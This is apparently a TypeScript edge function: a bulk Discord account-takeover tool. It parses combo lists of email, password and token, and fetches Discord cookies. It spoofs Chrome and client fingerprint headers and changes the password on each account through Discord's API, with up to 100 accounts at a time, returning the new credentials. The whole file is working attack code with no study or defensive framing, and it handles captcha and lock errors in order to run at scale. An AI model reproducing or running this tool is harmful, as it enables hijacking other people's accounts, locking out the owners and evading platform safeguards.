import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface AccountLine {
  email: string;
  password: string;
  token: string;
  fullLine: string;
}

function parseLine(line: string): AccountLine | null {
  const trimmed = line.trim();
  if (!trimmed || !trimmed.includes(':')) return null;
  
  const parts = trimmed.split(':');
  if (parts.length < 3) return null;
  
  const email = parts[0];
  const password = parts[1];
  const token = parts.slice(2).join(':').replace(/^["']|["']$/g, '');
  
  return { email, password, token, fullLine: trimmed };
}

async function getDiscordCookies(): Promise<string> {
  try {
    const res = await fetch("https://canary.discord.com", {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      },
    });
    const cookieHeader = res.headers.get("set-cookie") || "";
    const cookies = cookieHeader.split(',').map(c => c.split(';')[0].trim()).filter(Boolean);
    return cookies.join('; ') + '; locale=en-US';
  } catch {
    return "locale=en-US";
  }
}

function getHeaders(token: string, cookies: string) {
  return {
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': token,
    'content-type': 'application/json',
    'cookie': cookies,
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': 'en-US',
    'x-discord-timezone': 'Africa/Cairo',
    'x-super-properties': 'eyJvcyI6IldpbmRvd3giLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InBsIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjAuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjAuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjU2MjMxLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
  };
}

function generateRandomPassword(length = 12): string {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

async function changePassword(
  token: string,
  currentPass: string,
  newPass: string,
  cookies: string,
): Promise<{ success: boolean; newToken: string | null; error: string }> {
  try {
    const payload: Record<string, string> = {
      password: currentPass,
      new_password: newPass,
    };

    const response = await fetch("https://discord.com/api/v9/users/@me", {
      method: "PATCH",
      headers: getHeaders(token, cookies),
      body: JSON.stringify(payload),
    });

    if (response.status === 200) {
      const data = await response.json();
      return { success: true, newToken: data.token || null, error: "" };
    } else if (response.status === 400) {
      const data = await response.json();
      if (data.captcha_key) {
        return { success: false, newToken: null, error: "Captcha Required" };
      }
      if (data.password) {
        return { success: false, newToken: null, error: "Wrong Password" };
      }
      return { success: false, newToken: null, error: `Bad Request` };
    } else if (response.status === 403) {
      return { success: false, newToken: null, error: "Account Locked/Flagged" };
    } else if (response.status === 401) {
      return { success: false, newToken: null, error: "Unauthorized (Invalid Token)" };
    } else {
      return { success: false, newToken: null, error: `Error ${response.status}` };
    }
  } catch (e) {
    return { success: false, newToken: null, error: String(e) };
  }
}

async function processInBatches(
  accounts: AccountLine[],
  newPassword: string | null,
  threadCount: number,
): Promise<{ success: string[]; failed: string[]; errors: string[] }> {
  const results = { success: [] as string[], failed: [] as string[], errors: [] as string[] };
  const cookies = await getDiscordCookies();

  for (let i = 0; i < accounts.length; i += threadCount) {
    const batch = accounts.slice(i, i + threadCount);
    const promises = batch.map(async (account) => {
      const pass = newPassword || generateRandomPassword();
      try {
        const result = await changePassword(account.token, account.password, pass, cookies);
        if (result.success) {
          const newLine = `${account.email}:${pass}:${result.newToken || account.token}`;
          results.success.push(newLine);
        } else {
          results.failed.push(`${account.fullLine} | Error: ${result.error}`);
        }
      } catch (e) {
        results.errors.push(`${account.fullLine} | Error: ${String(e)}`);
      }
    });
    await Promise.all(promises);
    
    if (i + threadCount < accounts.length) {
      await new Promise(r => setTimeout(r, 2000));
    }
  }

  return results;
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { accounts, newPassword, threadCount = 5 } = await req.json();

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const parsed: AccountLine[] = [];
    for (const line of accounts) {
      const p = parseLine(line);
      if (p) parsed.push(p);
    }

    if (parsed.length === 0) {
      return new Response(
        JSON.stringify({ error: "No valid accounts found. Format: email:pass:token" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const results = await processInBatches(parsed, newPassword || null, Math.min(threadCount, 100));

    return new Response(
      JSON.stringify({ results, total: parsed.length }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (e) {
    return new Response(
      JSON.stringify({ error: String(e) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
